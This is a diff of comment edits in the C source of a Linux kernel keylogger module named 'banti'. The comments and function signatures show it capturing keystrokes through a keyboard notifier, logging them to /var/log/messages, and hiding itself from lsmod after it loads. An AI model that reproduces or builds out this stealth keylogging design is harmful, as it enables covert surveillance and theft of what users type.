@@ -46,9 +46,9 @@ void init_banti(void)
 
 
 /*
- * Function handle key signal and returns key 
- * in char value. Its uses switch operator, but
- * should be better if it will be done with arrays.
+ * Handle keys. Function handle key signal and returns key 
+ * in char value. Its uses switch operator, but should be 
+ * better if it will be done with arrays.
  */
 char banti_handle_key(int key)
 {
@@ -218,8 +218,6 @@ char banti_handle_key(int key)
 
 
 /*
- * Hide module
- *
  * Function hides module from module list so
  * it can not be checked with lsmod command
  */
@@ -243,10 +241,8 @@ void banti_module_hide(void)
 
 
 /*
- * Make module visible
- *
- * Function makes module visible again afther 
- * its hidden with banti_module_hide() function
+ * Make module visible. Function makes module visible again 
+ * afther its hidden with banti_module_hide() function
  */
 void banti_module_show(void)
 {
@@ -266,10 +262,9 @@ void banti_module_show(void)
 
 
 /*
- * Get notifed press key
- * 
- * Function catchs keypress from notifier block, handles
- * key code and writes finall char value in /var/log/messages
+ * Get notifed press key. Function catchs keypress from 
+ * notifier block, handles key code and writes finall char 
+ * value in /var/log/messages
  */
 int banti_key_notifer(struct notifier_block *nblock, unsigned long code, void *_param) 
 {
@@ -301,12 +296,9 @@ static struct notifier_block notifer_deamon =
 
 
 /*
- * Initialise module
- *
- * Function initialises module with insmod command
- * is given and hides it afther initialisation
+ * Initialise module. Function initialises module with insmod 
+ * command is given and hides it afther initialisation
  */
-
 static int __init banti_keylog_init(void)
 {
     /* Hide module */
